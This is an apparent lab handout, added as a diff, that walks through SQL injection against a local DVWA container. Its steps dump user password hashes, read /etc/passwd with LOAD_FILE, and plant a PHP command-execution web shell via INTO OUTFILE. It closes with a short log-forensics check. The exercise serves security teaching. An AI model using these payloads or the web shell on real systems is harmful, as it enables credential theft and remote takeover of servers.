@@ -1,0 +1,127 @@
+AIM: Extended SQLi – Reading/Writing files Extended SQLi, Protecting against SQLi,
+and SQLi Forensics
+2. Writing Files into the Target Web Server
+
+
+
+Step 1: Isntall Docker using command (sudo apt update & sudo apt install docker.io -y)
+
+sudo docker pull vulnerables/web-dvwa
+sudo docker run -d -p 80:80 vulnerables/web-dvwa
+
+Access DVWA:
+
+Open a browser and visit http://localhost
+Create or Reset Database:
+
+Click Create/Reset Database button on the DVWA homepage
+
+Login:
+
+Username: admin
+
+Password: password
+
+Set Security Level to Low:
+
+Go to DVWA Security
+
+Select Low
+
+Click Submit
+
+
+Step 1: Verify SQL Injection Vulnerability
+Navigate to SQL Injection module
+
+In the User ID input field, enter:
+
+text
+' or 1=1#
+
+Click Submit
+
+You should see data listing multiple users — confirming vulnerability
+
+
+Step 3: Extract Database Usernames and Password Hashes
+Input the following payload in User ID field:
+
+text
+' UNION SELECT user,password FROM users#
+Click Submit
+
+This should display usernames and hashed passwords
+
+Step 4: Read a File from the Server
+Try reading /etc/passwd file with this injection:
+
+text
+' UNION SELECT 1,LOAD_FILE('/etc/passwd')#
+Click Submit
+
+The file contents should appear on the page
+
+----------------------
+for finding container ID 
+run 
+docker ps -a
+and copy the first container id
+it will look like: fb6685b8747d
+
+You're running MySQL from your Kali host, not inside the Docker container. Run this:
+
+bash
+sudo docker exec -it <container-id> mysql -u root -p
+Enter password: click enter
+
+Then inside MySQL:
+sql
+"""""
+GRANT FILE ON *.* TO 'app'@'localhost';
+FLUSH PRIVILEGES;
+exit
+"""""
+Step 5: Write a PHP Backdoor File
+Because writing directly to the web directory is restricted, write the backdoor to /tmp:
+
+In User ID field, enter:
+
+text
+' UNION SELECT '<?php system($_GET["cmd"]); ?>','test' INTO OUTFILE '/tmp/shell.php'#
+Click Submit
+
+Operation should succeed without error
+
+Step 6: Move Backdoor to Web Root
+Execute the following in Docker to move the backdoor:
+
+bash
+sudo docker exec -it <container_id> cp /tmp/shell.php /var/www/html/
+Replace <container_id> with your DVWA container ID.
+
+Step 7: Test Remote Command Execution Backdoor
+In browser, visit:
+
+text
+http://localhost/shell.php?cmd=whoami
+It should display the webserver user
+
+Test other commands:
+
+text
+http://localhost/shell.php?cmd=id
+http://localhost/shell.php?cmd=ls -la /var/www/html
+
+
+Step 8: Perform Forensics Analysis
+Check Apache access logs for malicious queries:
+
+bash
+sudo docker exec -it <container_id> tail /var/log/apache2/access.log
+
+Look for injected payloads like UNION SELECT, LOAD_FILE, INTO OUTFILE, or suspicious queries fitting your SQLi attempts.
+
+
+
+
